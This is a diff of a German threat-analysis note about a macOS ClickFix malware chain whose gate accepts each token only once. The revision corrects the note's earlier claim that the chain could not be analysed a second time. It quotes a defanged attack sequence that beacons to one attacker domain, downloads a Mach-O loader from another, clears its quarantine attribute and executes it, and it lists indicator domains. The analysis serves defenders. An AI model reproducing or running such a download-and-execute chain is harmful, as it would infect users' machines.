@@ -1,6 +1,12 @@
-# Ein Versuch: eine ClickFix-Kette, die sich kein zweites Mal analysieren lässt
+# Ein Versuch: was ein Einmal-Gate tatsächlich schützt
 
 ## Was ein Einmal-Gate mit der Vorfallsbearbeitung macht — und warum der Quelltext diesen Fall nicht von einem legitimen unterscheiden konnte
+
+> **Richtiggestellt am 06.08.2026.** Diese Notiz erschien zuerst als *„eine ClickFix-Kette,
+> die sich kein zweites Mal analysieren lässt"*. Zwei Tage später wurde die Kette
+> vollständig zurückgeholt, und diese Behauptung hielt nicht. Der beschriebene Mechanismus
+> war real und richtig beobachtet; der daraus gezogene Schluss war zu stark. Siehe
+> Abschnitt 8.
 
 *Erstdokumentation, August 2026*
 
@@ -18,10 +24,10 @@ erst zu Wort.
 
 Bemerkenswert ist nicht die Technik, die ist gut dokumentiert. Bemerkenswert ist das
 **Gate**: Die erste Stufe meldet sich mit einem opferindividuellen Token bei einem
-Kontrollserver, und dieses Token wird **genau einmal** akzeptiert. Beim zweiten Versuch
-kommt nichts mehr. Diese eine Entwurfsentscheidung stellt die gesamte Untersuchung um — und
-sie vereitelte den Versuch, rund 70 Minuten nach einer öffentlichen Meldung ein frisches
-Sample zu beschaffen.
+Kontrollserver, und dieses Token wird **genau einmal** akzeptiert. Diese eine Entwurfsentscheidung stellt die
+gesamte Untersuchung um — nicht weil sie Analyse unmöglich macht, sondern weil sie ihr eine
+Uhr stellt. Abschnitt 8 hält fest, wie dieser Unterschied auf die harte Tour gelernt
+wurde.
 
 Diese Notiz ist das operative Gegenstück zum [Ad-Shield-Fall](../2026-08-ad-shield-welt-de/),
 der aus sehr ähnlich aussehenden Belegen den gegenteiligen Schluss zog. Zusammen gelesen
@@ -52,6 +58,16 @@ fi
 hxxps://ferncurrent14[.]com/curl/<kampagnen-token>
 ```
 
+**Stufe 3 — zurückgeholt am 06.08.2026** (siehe Abschnitt 8). Stufe 2 feuert in dem
+Moment, in dem das Opfer einfügt, eine Telemetrie-Meldung ab und lädt dann eine universelle
+Mach-O:
+
+```
+POST hxxps://grove-89[.]com/api/metrics/run?event=pasted     Header: user, BuildID
+     hxxps://ferncurrent14[.]com/<id>/DANTE/update  ->  /tmp/helper
+     xattr -c ; chmod +x ; ausfuehren
+```
+
 Drei Details, die man behalten sollte:
 
 - Stufe 1 läuft über **einfaches HTTP**, Stufe 2 über HTTPS. Die Gate-Abfrage ist damit auf
@@ -74,13 +90,15 @@ zurück, und die `if`-Bedingung greift nie.
 Dem Betreiber bringt das saubere Telemetrie pro Klick und macht wiederholte Ausführung in
 Analyseumgebungen wertlos. Für die Untersuchung heißt es:
 
-- **Stufe 2 lässt sich nicht nachträglich holen.** Wenn der Zwischenablage-Inhalt vor einem
-  liegt, kann das Token längst verbraucht sein — durch das Opfer oder durch den eigenen
-  ersten Blick.
-- **Das Payload ist im Nachhinein nicht überprüfbar.** Die *Adresse* der zweiten Stufe
-  lässt sich genau angeben. Was sie tat, nicht — wir hatten sie nie (siehe Abschnitt 5).
-- **Nachanalyse ist kein Auffangnetz.** Bei gewöhnlicher Web-Malware kann man das Artefakt
-  meist erneut abrufen. Hier ist der erste Kontakt der einzige.
+- **Ein verbrauchtes Token bleibt verbraucht.** Wenn der Zwischenablage-Inhalt vor einem
+  liegt, kann es längst verbrannt sein — durch das Opfer oder durch den eigenen ersten
+  Blick. Dieses eine Token kommt nicht zurück.
+- **Ein gesicherter Einzeiler ist nicht übertragbar.** An eine Kollegin weitergegeben oder
+  in eine Sandbox gelegt, liefert er nichts. Was wie ein reproduzierbares Artefakt aussieht,
+  ist eine Einmal-Fahrkarte.
+- **Nachträgliche Analyse ist unmöglich, wiederholte nicht.** Genau diesen Unterschied hat
+  die erste Fassung dieser Notiz verfehlt. Ein frischer Besuch einer noch ausliefernden
+  Lure erzeugt ein neues Token, und die Kette läuft erneut — siehe Abschnitt 8.
 
 Praktisch kehrt das die übliche Reihenfolge um. Normalerweise: beobachten, Hypothese
 bilden, dann sammeln, was die Hypothese braucht. Gegen ein Einmal-Gate gilt: **zuerst
@@ -153,8 +171,11 @@ Arbeit.
 
 ## 5. Was diese Notiz nicht belegt
 
-- **Das Payload.** Stufe 2 wurde nie abgerufen. Sie einer bestimmten Infostealer-Familie
-  zuzuordnen wäre ein Schluss aus der Form der Kette, kein Befund. Wir ziehen ihn nicht.
+- **Das Payload.** Stufe 2 und Stufe 3 wurden am 06.08.2026 beide zurückgeholt, der
+  Stealer selbst jedoch nicht: Stufe 3 ist ein Loader, dessen Nutzlast verschlüsselt in der
+  eigenen Datensektion liegt und nur im Speicher entschlüsselt wird. Die Familienzuordnung
+  — AMOS-Linie — stützt sich auf Ketten- und Binärmerkmale und ist als *eingeschätzt*
+  vermerkt, nicht als bestätigt. In den maschinenlesbaren Feldern bleibt sie `unknown`.
 - **Attribution.** Nichts hier sagt, wer dahintersteht. Eine Länderkennung ist kein
   Standort, ein Standort ist keine Staatsangehörigkeit, und gemietete Infrastruktur ist
   kein Eigentum. Die Edge-Kennungen in Serverantworten bezeichnen den nächstgelegenen
@@ -178,8 +199,12 @@ Vollständig und maschinenlesbar, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).
 ```
 enter-pverif-code.info      Gate Stufe 1 / Klick-Telemetrie (einfaches HTTP)
 makeverizyjar.info          Schwester-Gate, gleiches Hosting-AS
-ferncurrent14.com           Loader-Host Stufe 2
+ferncurrent14.com           Loader-Host Stufe 2 und 3
+grove-89.com                Einfüge-Konversionsmeldung (ergänzt 06.08.2026)
 ```
+
+`grove-89.com` hatte zum Zeitpunkt des Fundes überhaupt keine öffentliche Scan-Historie —
+und feuert, bevor das Payload geladen wird. Damit ist es das früheste Netzsignal der Kette.
 
 **Die Gates stehen nicht hinter dem Proxy.** Nachgeprüft am 06.08.2026 gegen zwei
 unabhängige Resolver: Beide Gate-Domains nutzen Cloudflare-Nameserver, ihre `A`-Records
@@ -251,7 +276,77 @@ ist und wie sich seine Infrastruktur verhält.
 
 ---
 
-## 8. Umgang mit dem Fall
+## 8. Richtigstellung (06.08.2026): das Payload war doch zu beschaffen
+
+Das ursprüngliche Argument lautete, ein Einmal-Gate kehre die Reihenfolge einer
+Untersuchung um: Das Token verbrenne beim ersten Kontakt, das Payload sei fort, bevor man
+merkt, dass man es braucht.
+
+Zwei Tage später wurde die vollständige Kette zurückgeholt — Stufe 2, Stufe 3 und die
+Mach-O.
+
+**Das Token ist einmalig. Die Lure ist es nicht.** Ein zweiter Besuch einer noch
+ausliefernden Lure-Seite erzeugt ein frisches Token, und die Kette läuft von vorn. Was das
+Gate verhindert, ist *nachträgliche* Analyse: Zu einem verbrauchten Token führt kein Weg
+zurück, und ein gesicherter Einzeiler funktioniert in fremder Hand nicht. Vorwärts ist
+alles erreichbar, rückwärts nichts.
+
+Die richtige Aussage lautet also nicht „das lässt sich kein zweites Mal analysieren",
+sondern:
+
+> **Die Belege haben eine Haltbarkeit, und Bereinigung verkürzt sie.**
+
+### Der unangenehme Teil
+
+Diese Frist läuft gegen die Meldearbeit. Jede Stunde, die in die Bereinigung einer
+kompromittierten Seite geht, ist eine Stunde näher am Verlust des Samples — und das Sample
+entscheidet, ob eine Meldung überhaupt eine Schadsoftware-Familie benennen kann, woran sich
+die Empfänger orientieren.
+
+Die ursprüngliche Notiz behandelte das als Reihenfolgeproblem, das sich optimieren lässt.
+Das ist es nicht. Es ist ein echter Konflikt zwischen zwei Pflichten, und er löst sich
+nicht durch geschickte Reihenfolge, sondern durch Parallelität: Die Sicherungsumgebung muss
+stehen, **bevor** die erste Meldung hinausgeht, damit beide Stränge nicht um dasselbe
+Zeitfenster konkurrieren. Hier taten sie es, und die Sicherung gelang trotzdem. Das war
+Glück. Darauf zu planen, dass die Infrastruktur die Reaktion überlebt, ist ein Fehler.
+
+### Was das Sample wert war
+
+- Stufe 3 erwies sich als **Loader, nicht als Stealer** — sechzehn Imports, ein 69.632 Byte
+  großer verschlüsselter Block bei Entropie 7,997, dazu `mlock`/`munlock`, um die
+  entschlüsselte Nutzlast aus dem Swap zu halten. Das ist eine Anti-Forensik-Maßnahme,
+  gerichtet auf genau die Untersuchung, die ein Verteidiger nach einem Vorfall anstellt —
+  und aus den Skripten war davon nichts zu sehen.
+- In Stufe 2 tauchte eine **Konversionsmeldung** auf: ein POST in dem Moment, in dem das
+  Opfer einfügt, noch bevor irgendetwas geladen wird. Das ist eine Erkennungsgelegenheit
+  *vor* der Kompromittierung, und sie existierte in keinem der Artefakte aus dem ersten
+  Zusammentreffen.
+- Zwei nicht standardisierte Request-Header tragen Kampagnen- und Build-Kennungen.
+
+Beim letzten Punkt griff der erste Entwurf der technischen Analyse zu weit, und es lohnt
+festzuhalten, warum: Er führte die beobachteten Header-*Werte* als Indikatoren, mit der
+Begründung, sie kämen vom Builder und überlebten deshalb eine Domain-Rotation. Diese
+Begründung ist plausibel und vollständig unbelegt — es gibt eine Beobachtung. Veröffentlicht
+sind jetzt die Header-*Namen*; die Werte stehen in der Analyse, wo man sieht, dass sie
+genau einmal vorkamen.
+
+### Angepasste Handlungsempfehlung
+
+1. Ein Einmal-Gate ist eine **Uhr**, kein Schloss.
+2. Die Sicherungsumgebung steht, bevor gemeldet wird, nicht danach.
+3. **Von der Auslieferung nicht auf die Fähigkeit schließen.** Nach den Skripten sah das
+   nach schlichtem Herunterladen und Ausführen aus. Es war ein selbstentschlüsselnder
+   In-Memory-Loader — in einem Bericht etwas grundlegend anderes.
+4. Erweist sich eine Behauptung als zu stark, wird die Notiz geändert und nicht still
+   zurückgezogen. Der Mechanismus war real und richtig beobachtet. Falsch war nur der
+   Schluss.
+
+Vollständige technische Darstellung, samt dem, was gegen das Sample nachgerechnet wurde:
+[macos-threat-tracking, Kampagne DANTE](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/payload_analysis.md).
+
+---
+
+## 9. Umgang mit dem Fall
 
 Die betroffene Schule wurde am selben Tag unterrichtet, unentgeltlich und ohne
 Auftragsinteresse, mit Maßnahmenvorschlägen und einem Textbaustein für die Elternschaft.
